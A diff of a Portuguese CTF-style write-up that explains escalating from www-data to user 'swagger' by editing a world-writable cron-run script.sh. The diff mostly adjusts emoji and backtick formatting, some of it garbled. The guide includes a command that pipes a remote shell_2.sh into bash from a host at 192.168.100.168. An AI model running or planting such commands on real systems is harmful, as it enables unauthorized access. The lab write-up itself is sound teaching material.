@@ -10,9 +10,9 @@
 ## 🧠 Resumo: Como Escalar Privilégios para o Usuário '👑 `swagger`'
 
 ### Situação:
-- Existe um arquivo chamado `📜 `script.sh`` com permissão `777`:
+- Existe um arquivo chamado `📜`script.sh`` com permissão `777`:
   ```txt
-  -rwxrwxrwx 1 user-👑 `swagger` user-👑 `swagger` 184 Jun 1 2023 📜 `script.sh`
+  -rwxrwxrwx 1 user-`swagger` user-`swagger` 184 Jun 1 2023 `script.sh`
   ```
 - Isso significa que **qualquer usuário pode ler, escrever e executar** esse arquivo.
 - O **dono do arquivo é o usuário '👑 `swagger`'**, que tem mais privilégios que o usuário atual (`👤 `www-data``).
@@ -26,7 +26,7 @@
 ### Solução:
 1. Editar o `📜 `script.sh`` e **inserir um comando de shell reverso**, por exemplo:
    ```bash
-   📡 `curl http://192.168.100.168:8000/shell_2.sh | bash`
+   📡 `  curl http://192.168.100.168:8000/shell_2.sh | bash  `
    ```
 2. **Esperar o cron job executá-lo automaticamente** (ele roda a cada minuto).
    - Como o script será executado pelo próprio usuário `👑 `swagger``, o shell reverso retornará com os privilégios dele.
@@ -53,8 +53,8 @@ Conteúdo do .backup:
 ##### Script em desenvolvimento visualizar containers ######
 ###########################################################
 ######## verificando containers em execução ###############
-🐳 `docker ps`
-a=$(🐳 `docker ps` | cut -d " " -f1 | grep -v "CONTAINER")
+docker ps
+a=$(`docker ps` | cut -d " " -f1 | grep -v "CONTAINER")
 
 ######################## Docker Inspect ###################
 🔍 `docker inspect` $a
